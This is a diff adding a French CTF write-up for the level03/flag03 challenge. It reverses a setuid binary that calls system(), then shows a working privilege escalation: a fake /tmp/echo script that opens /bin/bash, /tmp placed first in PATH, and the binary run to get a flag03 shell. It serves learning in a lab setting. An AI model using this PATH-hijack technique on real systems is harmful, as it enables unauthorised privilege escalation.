@@ -1,0 +1,61 @@
+# Exploitation du niveau flag03
+
+## 1. Analyse de l'exécutable level03
+
+En listant les fichiers du répertoire, nous trouvons :
+
+```sh
+ls
+level03
+```
+
+En effectuant une analyse en reverse engineering, nous identifions les fonctions appelées dans l’exécutable :
+
+```sh
+getegid@plt  
+geteuid@plt  
+setresgid@plt  
+setresuid@plt  
+system@plt  
+```
+
+## 2. Comprendre l’exploitation possible
+
+setresgid / setresuid : Ces appels permettent d’exécuter le programme avec les privilèges du propriétaire du fichier, et non ceux de l’utilisateur actuel.
+system() : Cette fonction exécute une commande système, ce qui peut être exploité en manipulant la variable d’environnement PATH.
+
+Le but est d’exploiter l’appel de system() pour exécuter un shell avec les privilèges de flag03.
+
+## 3. Création d’un script malveillant et modification du PATH
+
+Nous allons créer un faux echo qui, au lieu d’afficher du texte, ouvrira un shell.
+
+📌 Créer un script dans /tmp (seul endroit où nous pouvons écrire)
+
+```sh
+echo '#!/bin/bash' > /tmp/echo
+echo '/bin/bash' >> /tmp/echo
+chmod +x /tmp/echo
+```
+
+Nous modifions la variable PATH pour qu’elle prenne en priorité notre version de echo :
+
+```sh
+export PATH="/tmp:$PATH"
+```
+
+## 4. Exécution de level03
+
+Nous exécutons ensuite l’exécutable level03 :
+
+./level03
+
+Grâce à la modification du PATH, lorsqu’il appelle echo, c’est notre script qui s’exécute, ouvrant un shell avec les droits de flag03.
+
+## 5. Vérification de l’utilisateur et récupération du flag
+
+```sh
+whoami
+flag03
+getflag
+```
